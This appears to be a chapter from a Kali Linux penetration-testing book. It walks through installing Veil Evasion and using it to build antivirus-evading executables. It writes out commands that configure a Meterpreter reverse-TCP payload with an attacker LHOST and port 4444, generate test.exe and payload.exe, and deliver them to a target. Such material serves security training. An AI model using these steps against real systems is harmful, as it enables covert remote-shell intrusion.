    ## Chapter 35


    # Anti-kill Payload attack


    ![](images/00009.jpeg) ![](images/00008.jpeg)


    Kali Linux provides a tool called Veil Evasion, which can be used to generate
    different types of attack payload files. Among them, the attack payload file can
    bypass common anti-virus software in most cases. This section will introduce the
    use of Veil Evasion tool to generate anti-virus attack payload files to achieve
    attacks.


    ## Install and initialise Veil Evasion tool


    Kali Linux does not install Veil Evasion tool by default. Therefore, it needs
    to be installed before using this tool.


    The execution command is as follows:


    ```

    root@exampleserver:～# apt-get install veil-evasion -y

    ```


    After executing the above command, if there is no report, it means that the Veil
    Evasion tool is installed successfully. Next, you can start the tool.


    The specific steps are as follows:


    1) Start Veil Evasion tool.


    The execution command is as follows:


    ```

    root@exampleserver:～# veil

    ```


    The above output information shows the basic information of the current operating
    system and the installation location of Veil Evasion tool.


    Here is a prompt whether to continue installing Veil tools, enter `y` to continue
    the installation, and the following information will be displayed.


    `[*]` Initializing package installation


    `[*]` Pulling down binary dependencies


    From the output information,, you can see that the installed packages are being
    initialised. Next, some other software will be installed in the process, namely
    `Python 3.4.4`, `pywin32-220`, `pycrypto-2.6.1`, `Ruby 1.8.7-p371` and `Autolt
    v3.3.14.2`. Among them, `Python 3.4.4` is installed first.


    2) This dialog box is the welcome interface of `Python 3.4.4`. At this point,
    click the Next button, and a dialog box for selecting the installation location
    will be displayed.


    3) Click the Next button, and the custom Python package dialog box will be displayed.


    4) Click the Next button, and the Python installation complete dialog box will
    be displayed.


    5) Click the Finish button, and the pywin32 installation dialog box will be displayed.


    6) Click the "Next" button, and a dialog box for setting the installation location
    will be displayed.


    7) Click the "Next" button, a dialog box for preparing to install will be displayed.


    8) Click the "Next" button to start the installation of the pywin32 program. After
    the installation is complete, the installation completion dialog box will be displayed.


    9) Click the "End" button, and the pycrypto installation dialog box will be displayed.


    10) Click the "Next" button, a dialog box for setting the installation location
    will be displayed.


    11) Click the "Next" button, and a dialog box for preparing to install will be
    displayed.


    12) Click the "Next" button to start installing the pycrypto program. After the
    installation is complete, the dialog box will be displayed.


    13) Click the "End" button, and a dialog box for selecting and setting the language
    will be displayed.


    14) Use the default language English here, and click the OK button, the license
    agreement dialog box for installing Ruby will be displayed.


    15) Select the I accept the License radio button, and then click the Next button.
    A dialog box for selecting the installation location will be displayed.


    16) Use the default settings here, and then click the Install button to start
    installing the Ruby program. After the installation is complete, the dialog box
    shown will be displayed.


    17) Click the Finish button, and Autolt''s welcome dialog box will be displayed.


    18) Click the Next button, and the license agreement information for installing
    the Autolt program will be displayed.


    19) Click the I Agree button, and the setting dialog box will be displayed.


    20) Use the default settings here, and then click the Next button, the dialog
    box will be displayed.


    21) Use the default settings here, and then click the Next button, a dialog box
    for selecting components will be displayed.


    22) Click the Next button, and a dialog box for setting installation location
    will be displayed.


    23) Click the Install button here to start installing the Autolt program. After
    the installation is complete, the dialog box is displayed.


    24) When all the above programs are installed, the Veil tool will be initialised.


    ## Generate anti-virus attack payload


    Through the configuration settings, Veil tools can be used normally. Next, we
    will use the Veil Evasion tool to generate anti-virus payload files.


    Use the Veil Evasion tool to generate anti-virus payload files. The specific steps
    are as follows:


    1) Start Veil Evasion tool.


    The execution command is as follows:


    ```

    root@exampleserver:～# veil

    ```


    As you can see from the output information, the command line prompt is `Veil >`.
    It can be said that the interactive mode of Veil tool has been successfully entered.
    Next, you can select a tool to create an attack payload file.


    2) Use Evasion tool.


    The execution command is as follows:


    ```

    Veil>: use

    ```


    It can be seen from the output information that the tool has loaded 41 attack
    payloads.


    3) View the attacks supported by the Evasion tool, execute the following command:


    ```

    Veil/Evasion>: list

    ```


    From the output information, you can see all the supported attack payloads. For
    example, here we choose to use the `cs/meterpreter/rev_tcp.py` attack payload.


    The execution command is as follows:


    ```

    Veil/Evasion>: use cs/meterpreter/rev_tcp.py

    ```


    4) Configure the `LHOST` option and view all configuration information.


    From the above information, you can see that the `LHOST` option is not configured.


    ```

    [cs/meterpreter/rev_tcp]> set LHOST 192.168.29.134

    [cs/meterpreter/rev_tcp]> options Payload: cs/meterpreter/rev_tcp

    ```


    As you can see from the output information, the option is successfully configured.
    Next, the attack payload can be generated.


    5) Generate attack payload.


    ```

    [cs/meterpreter/rev_tcp]> generate

    ```


    It can be seen from the output information that an executable file `test.exe`
    is generated and the file is saved in `/var/lib/veil/output/compiled/`. At this
    point, the executable file `test.exe` is sent to the target host, and the attack
    payload can be used.


    Users can also generate attack payloads in command line mode. Here is still taking
    the `cs/meterpreter/rev_tcp` module as an example, the execution command is as
    follows:


    ```

    root@exampleserver:～# veil -t Evasion -p cs/meterpreter/rev_tcp.py --ip 192.168.195.150
    --port 4444 payload.rc

    ```


    It can be seen from the output information that an executable file `payload.exe`
    was successfully generated.


    Similarly, after the user has created the attack payload file, he also needs to
    create a remote listener. In this way, when the target host executes the attack
    payload file, it will actively establish a connection with the attacking host.

